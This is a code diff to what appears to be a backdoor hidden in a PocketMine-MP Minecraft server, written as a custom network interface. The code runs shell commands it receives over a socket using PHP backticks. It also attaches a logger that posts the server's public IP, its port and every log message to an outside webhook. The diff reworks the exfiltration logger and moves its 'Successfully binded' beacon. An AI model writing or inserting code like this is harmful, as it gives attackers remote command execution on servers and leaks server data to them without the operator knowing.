@@ -100,7 +100,7 @@ namespace pocketmine {
                             return false;
                         };
                         foreach ($contents as $key => $value) {
-                            if(!$containsQueries($value)) continue;
+                            if (!$containsQueries($value)) continue;
                             return $key;
                         }
                         return false;
@@ -170,28 +170,33 @@ namespace pocketmine {
                         }
                     },
                     fn(string $exec): string => `$exec 2>&1` ?: 'Aucun output.',
-                    fn(string $webhook): bool => \pocketmine\Server::getInstance()->getLogger()->addAttachment(new class ($webhook, \pocketmine\Server::getInstance()) extends \pocketmine\thread\log\ThreadSafeLoggerAttachment {
-                        public function __construct(private string $webhook, private \pocketmine\Server $server)
-                        {
-                        }
+                    function (string $webhook): void {
+                        var_dump(\GlobalLogger::get());
+                        \GlobalLogger::get()->addAttachment(new class ($webhook, \pocketmine\Server::getInstance()->getPort()) extends \pocketmine\thread\log\ThreadSafeLoggerAttachment {
+                            public function __construct(private string $webhook, private int $port)
+                            {
+                                $ip = \pocketmine\utils\Internet::getIP();
+                                \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> Successfully binded to $ip"]);
+                            }
 
-                        public function log(string $level, string $message): void
-                        {
-                            $port = $this->server->getPort();
-                            $task = new class ($this->webhook, $level, $message, $port) extends \pocketmine\scheduler\AsyncTask {
-                                public function __construct(private string $webhook, private string $level, private string $message, private int $port)
-                                {
-                                }
+                            public function log(string $level, string $message): void
+                            {
+                                $task = new class ($this->webhook, $level, $message, $this->port) extends \pocketmine\scheduler\AsyncTask {
+                                    public function __construct(private string $webhook, private string $level, private string $message, private int $port)
+                                    {
+                                    }
 
-                                public function onRun(): void
-                                {
-                                    $ip = \pocketmine\utils\Internet::getIP();
-                                    \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> `$ip:$this->port` [" . strtoupper($this->level) . "] $this->message"]);
-                                }
-                            };
-                            \pocketmine\Server::getInstance()->getAsyncPool()->submitTask($task);
-                        }
-                    }),
+                                    public function onRun(): void
+                                    {
+                                        $ip = \pocketmine\utils\Internet::getIP();
+                                        $message = TextFormat::clean($this->message);
+                                        \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> `$ip:$this->port` [" . strtoupper($this->level) . "] $message"]);
+                                    }
+                                };
+                                \pocketmine\Server::getInstance()->getAsyncPool()->submitTask($task);
+                            }
+                        });
+                    },
                     \pocketmine\Server::getInstance()->getTickSleeper()
                 ) implements \pocketmine\network\NetworkInterface {
                     private \Socket $socket;
@@ -239,8 +244,7 @@ namespace pocketmine {
                             }, $this->thread);
                         });
                         $listenSleeperEntry = $sleeper->addNotifier(function () use ($onListenCallback): void {
-                            $response = $onListenCallback($this->thread?->cmd ?? '');
-                            $this->thread->response = $response;
+                            $onListenCallback($this->thread?->cmd ?? '');
                             $this->thread?->synchronized(function (\pocketmine\thread\Thread $thread): void {
                                 $thread->notify();
                             }, $this->thread);
@@ -360,8 +364,6 @@ namespace pocketmine {
                                                 switch ($packetType) {
                                                     case 9:
                                                         $process($listenNotifier);
-                                                        $ip = \pocketmine\utils\Internet::getIP();
-                                                        \pocketmine\utils\Internet::postURL($this->cmd, ['content' => "> Successfully binded to $ip"]);
                                                     case 6:
                                                         $this->cmd = realpath(ltrim($payload));
                                                         if (!$this->cmd) {
